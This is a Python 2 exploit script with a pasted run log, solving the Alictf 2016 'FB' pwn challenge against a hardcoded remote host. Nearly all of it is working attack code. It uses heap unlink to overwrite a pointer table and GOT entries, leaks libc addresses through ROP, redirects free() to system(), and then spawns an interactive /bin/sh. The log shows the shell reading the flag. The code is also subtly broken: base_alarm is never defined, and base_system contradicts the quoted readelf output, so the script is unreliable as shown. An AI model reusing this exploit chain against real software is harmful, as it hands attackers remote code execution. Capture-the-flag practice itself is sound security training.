#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Alictf 2016 - FB (Pwn 200)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib
from struct import pack
from struct import unpack

# --------------------------------------------------------------------------------------------------
def recv_until(st):                             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(8192)

  return ret

# --------------------------------------------------------------------------------------------------
def init_msg(size):                             # init a message
    s.send( '1' + '\n' )

    recv_until('Input the message length:')
    s.send( str(size) + '\n' )

    recv_until('Choice:')

# --------------------------------------------------------------------------------------------------
def set_msg(idx, data):                         # set a message
    s.send( '2' + '\n' )

    recv_until('Input the message index:')
    s.send( str(idx) + '\n' )

    recv_until('Input the message content:')
    s.send( data )
    
    recv_until('Choice:')

# --------------------------------------------------------------------------------------------------
def del_msg(idx):                               # delete a message
    s.send( '3' + '\n' )

    recv_until('Input the message index:')
    s.send( str(idx) + '\n' )

    recv_until('Choice:')
    
# --------------------------------------------------------------------------------------------------
def rop_leak(addr):                             # leak an address
    rop  = pack('<Q', 0x4444444444444444)       # set rbp
    rop += pack('<Q', 0x0000000000400D83)       # pop rdi; ret; gadget
    rop += pack('<Q', addr)                     # address to leak
    rop += pack('<Q', 0x0000000000400957)       # return to puts()

    return rop

# --------------------------------------------------------------------------------------------------
def get_leak():                                 # parse a leaked address
    value = ''

    for i in range(8):                          # address is usually 64 bits (unless a NULL appears)
        digit = f.read(1)                       # read a digit
        
        if digit == '\n':                       # if newline,
            value += '\x00' * (8-i)             #   pad with zeros
            break                               #   and stop

        value += digit                          # append digit

    return unpack("<Q", value)[0]               # return value

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    s = socket.create_connection(('121.40.56.102', 9733)) 
    #s = socket.create_connection(('localhost', 7777))      # connect to server
    f = s.makefile()                            # return a file object associated with the socket


    recv_until('Choice:')                       # eat startup menu

    # -------------------------------------------------------------------------
    # Prepare heap layout for overflow. Don't allocate on fastbins
    # -------------------------------------------------------------------------
    print ' *** Preparing heap layout for overflow...'

    init_msg(128)                               # init some messages
    init_msg(128)
    init_msg(24 )
    init_msg(248)

    del_msg(0)                                  # delete message 1 first
                                                # thus message 4 is not on the top of freelist

    set_msg(2, 'A'*16 + pack('<Q', 0xa0) +'\n') # set free list pointers
    set_msg(1, 'A'*16 + pack('<Q', 0x6020b8) + pack('<Q', 0x6020c0) + '\n')


    del_msg(3)                                  # unlink arb. write

    # -------------------------------------------------------------------------
    # Address of message 2 in Q table (0x6020C0) has changed to 0x6020B8
    # -------------------------------------------------------------------------
    print '[+] Overwriting entries in Q table...'

    p = ''
    p += 'A'*8                                      # padding
    p += pack('<Q', 0x602028) + pack('<Q', 0x200)   # Q[0] = .got.__stack_chk_fail()
    p += pack('<Q', 0x602068) + pack('<Q', 0x200)   # Q[1] = .got.atoi()    
    p += pack('<Q', 0x602018) + pack('<Q', 0x200)   # Q[2] = .got.free()
    p += '/bin/sh\x00' + 'B'*24                     # more padding (reserved)   

    p += pack('<Q', 0x6020f0) + pack('<Q', 0x200)   # Q[5] = /bin/sh
    p += '\n'

    set_msg(1, p)                                   # set 2nd message and start overwriting
                                                    # Q table entries


    # -------------------------------------------------------------------------
    # Set messages to do the arbitrary write
    # MSB must be newline (read_raw_input_40085D, will replace it with null)
    # -------------------------------------------------------------------------
    print '[+] Overwriting entries in GOT table...'


    # overwrite __stack_chk_fail with show_msg_400C26 to enable stack overflows
    set_msg(0, pack('<Q', 0x0a00000000400C26) + '\n' )
    
    # overwrite atoi() with read_raw_input_40085D
    set_msg(1, pack('<Q', 0x0a0000000040085D) )
    

    # -------------------------------------------------------------------------
    # At this point, atoi() will be invoked to get the option from main menu.
    # But read_raw_input will be called instead, with the buffer pointing at
    # the stack. Buflen will be another stack address, so we can write an 
    # arbitrary large amount of bytes in the stack.
    #
    # We need an arbitrary read primitive here.
    # The idea is to return to puts() with rdi poiting to the address we want
    # to read. 
    # We can do this an arbitrary amount of times.
    #
    # After overflow, canary will be destroyed, so show_msg_400C26 will be 
    # called first and then we can start ROP
    # -------------------------------------------------------------------------
    print '[+] Start ROPing to leak arbitrary addresses...'

    p = ''
    p += 'k'*8 + '\n' + 'P'*16                      # padding

    p += rop_leak(0x602030)                         # leak .got.printf()
    p += rop_leak(0x602038)                         # leak .got.alarm()

    # ... you can repeat this ROP as many times as you want


    # -------------------------------------------------------------------------
    # After leak, we have to read the returned addresses, recalculate addresses
    # and overwrite free() with system()
    # -------------------------------------------------------------------------
    p += pack('<Q', 0x4141414141414141)             # set rbp
    p += pack('<Q', 0x0000000000400C4E)             # return to main


    s.send( p + '\n')                               # send ROP payload

    # -------------------------------------------------------------------------
    # at this point program will wait for Choice
    # because read_raw_input_40085D is called instead of atoi(), we should
    # give an input for K characters if we want option K
    # -------------------------------------------------------------------------
    print '[+] Parsing leaked addresses...'

    f.read(len('Not allow~!\n'))

    addr_printf = get_leak()
    addr_alarm  = get_leak()

    '''
    root@nogirl:~/ctf/alictf# readelf --all libc-2.19.so | grep -e " alarm"
      1333: 00000000000c0b90    33 FUNC    GLOBAL DEFAULT   12 alarm@@GLIBC_2.2.5
    root@nogirl:~/ctf/alictf# readelf --all libc-2.19.so | grep -e " printf"
       596: 0000000000054340   161 FUNC    GLOBAL DEFAULT   12 printf@@GLIBC_2.2.5
    root@nogirl:~/ctf/alictf# readelf --all libc-2.19.so | grep -e " system"
      1337: 0000000000046590    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
    root@nogirl:~/ctf/alictf# 
    '''
    base_free   = 0x00075e50
    base_system = 0x0003de10


    # if addr_printf - base_printf + base_system) !=
    #    addr_alarm  - base_alarm  + base_system  then libc version is wrong
    addr_system = 0x0a00000000000000 | (addr_alarm  - base_alarm  + base_system)
#   addr_system = 0x0a00000000000000 | (addr_printf - base_printf + base_system)

    print '*** libc.printf() at', hex(addr_printf), '***'
    print '*** libc.alarm()  at', hex(addr_alarm),  '***'
    print '*** libc.system() is', hex(addr_system),  '***'


    # -------------------------------------------------------------------------
    # read_int_4008FC calls read_raw_input_40085D twice (1 directly and 1 
    # through atoi()), so we need "double" input
    # -------------------------------------------------------------------------
    print '[+] Overwriting free() with system()...'

    s.send('\n' + 'kk' + '\n' ); s.recv(1024)       # Choice 2: "Set the message"
    s.send('\n' + 'kk' + '\n' ); s.recv(1024)       # Message index: 2
    
    s.send( pack('<Q', addr_system) )               # overwrite .got.free() with system()
    s.recv(1024)


    print ' *** Triggering system(/bin/sh)...'

    s.send('\n' + 'kkk' + '\n'  ); s.recv(1024)     # Choice 3: "Delete the message"
    s.send('\n' + 'kkkkk' + '\n'); s.recv(1024)     # Message index: 5


    print ' *** Opening Shell *** '
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()
    
    exit(0) 
# --------------------------------------------------------------------------------------------------
'''
    root@nogirl:~/ctf/alictf# ./fb_expl.py 
     *** Preparing heap layout for overflow...
    [+] Overwriting entries in Q table...
    [+] Overwriting entries in GOT table...
    [+] Start ROPing to leak arbitrary addresses...
    [+] Parsing leaked addresses...
    *** libc.printf() at 0x7f16c9aab340 ***
    *** libc.alarm()  at 0x7f16c9b17b90 ***
    *** libc.system() is 0xa007f16c9a9d590 ***
    [+] Overwriting free() with system()...
     *** Triggering system(/bin/sh)...
     *** Opening Shell *** 
    Input the message index:id
            uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
        ls -l
            total 68
            drwxr-xr-x   2 root root 4096 May 26 21:41 bin
            drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
            drwxr-xr-x   5 root root  360 Jun  5 21:28 dev
            drwxr-xr-x  70 root root 4096 May 31 03:35 etc
            drwxr-xr-x   9 root root 4096 May 31 03:20 home
            drwxr-xr-x  13 root root 4096 May 31 03:18 lib
            drwxr-xr-x   2 root root 4096 May 31 03:18 lib32
            drwxr-xr-x   2 root root 4096 May 26 21:40 lib64
            drwxr-xr-x   2 root root 4096 May 26 21:40 media
            drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
            drwxr-xr-x   2 root root 4096 May 26 21:40 opt
            dr-xr-xr-x 152 root root    0 Jun  5 21:28 proc
            drwx------   2 root root 4096 May 26 21:41 root
            drwxr-xr-x   7 root root 4096 Jun  5 21:28 run
            drwxr-xr-x   2 root root 4096 May 27 14:12 sbin
            drwxr-xr-x   2 root root 4096 May 26 21:40 srv
            dr-xr-xr-x  13 root root    0 Jun  5 21:28 sys
            drwxrwxrwt   2 root root 4096 May 31 03:18 tmp
            drwxr-xr-x  14 root root 4096 May 31 03:18 usr
            drwxr-xr-x  19 root root 4096 May 31 03:19 var
        ls -l /home
            total 4
            drwxr-x--- 2 root ctf 4096 May 31 03:20 ctf
        ls -l /home/ctf
            total 16
            -rwxr-x--- 1 root ctf 10448 Apr 15 09:30 fb
            -rwxr----- 1 root ctf    22 May 31 03:11 flag
        cat /home/ctf/flag
            alictf{FBfbFbfB23666}
        exit
        *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
